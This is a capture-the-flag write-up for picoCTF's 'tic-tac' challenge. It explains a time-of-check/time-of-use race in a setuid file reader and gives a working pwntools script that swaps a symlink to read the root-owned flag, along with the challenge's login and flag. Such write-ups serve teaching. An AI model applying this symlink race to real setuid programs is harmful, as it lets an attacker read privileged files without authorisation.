# tic-tac

## Challenge

The challenge description is as follows:

> Someone created a program to read text files;
> we think the program reads files with root privileges but apparently it only accepts to read files that are owned by the user running it.
> ssh to saturn.picoctf.net:56639, and run the binary named "txtreader" once connected.
> Login as ctf-player with the password, d137d16e

Connecting to the server, we find the following files in our home directory:

```
ctf-player@pico-chall$ ls -l
total 28
-rw------- 1 root       root          32 Mar 16 02:28 flag.txt
-rw-r--r-- 1 ctf-player ctf-player   912 Mar 16 01:30 src.cpp
-rwsr-xr-x 1 root       root       19016 Mar 16 02:28 txtreader
```

Presumably, the src.cpp file given is the source code for the txtreader set-uid binary.
The description and the code indicates that we can use it to read files that we own.

## Solution

There is a potential race condition.
The file may change between when the file owner is checked and when the file contents are read.

If we pass a symlink to the program, the program will follow the symlink and read the target file.
If this symlink changes between the file owner check and reading the file, it will check ownership for the first file but read the contents of the second file.

To exploit this, we have a program continuously change a symlink target between a file we own and the flag file.
Then, while that runs in the background, we continuously run the txtreader program on our symlink.
Eventually, one of these attempts will successfully trigger the race condition and print the flag.

## Exploit

```py
#!/usr/bin/env python3

from pwn import *

host = args.HOST or 'saturn.picoctf.net'
port = int(args.PORT or 53230)
username = 'ctf-player'
password = 'd137d16e'

s = ssh(host=host, port=port, user=username, password=password)
io = s.process('/bin/sh', env={'PS1':''})
io.sendline(b"echo '' > blank.txt")
io.sendline(b"while true; do ln -sf flag.txt link; ln -sf blank.txt link; done &")
io.sendline(b"echo sync")
io.recvuntil(b"sync\n")

while True:
    io.sendline(b"./txtreader link")
    line = io.recvline()
    if b"picoCTF" in line:
        print(line)
        break

io.interactive()
```

## Flag

```
picoCTF{ToctoU_!s_3a5y_f482a247}
```
